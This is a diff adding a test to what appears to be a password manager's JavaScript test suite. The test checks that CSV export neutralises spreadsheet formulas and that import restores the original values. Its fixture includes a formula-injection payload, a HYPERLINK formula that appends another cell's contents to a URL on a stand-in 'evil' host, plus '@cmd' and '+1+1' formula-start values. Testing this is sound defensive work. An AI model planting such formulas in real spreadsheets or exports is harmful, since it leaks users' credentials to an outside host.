@@ -106,3 +106,13 @@ test('exports: CSV and JSON round trip; encrypted export needs the right passwor
   await assert.rejects(importEncrypted(enc, 'export password'), /safe range/, 'a file asking for 1000 iterations is refused by default')
   await assert.rejects(importEncrypted('nope', 'x'), /not a TheVault/)
 })
+
+test('CSV export neutralises spreadsheet formulas and import restores them', () => {
+  const evil = newItem('login')
+  evil.name = '=HYPERLINK("https://evil/?"&H2,"x")'; evil.data.username = '@cmd'; evil.data.password = '+1+1'
+  const csv = exportCsv([evil])
+  assert.ok(csv.includes('"\'=HYPERLINK('), 'the name cell is text, not a formula')
+  assert.ok(!/(^|,)"[=+@-]/m.test(csv.split('\r\n')[1]), 'no cell starts with a formula character')
+  const back = importCsv(csv).items[0]
+  assert.equal(back.name, evil.name); assert.equal(back.data.username, '@cmd'); assert.equal(back.data.password, '+1+1')
+})
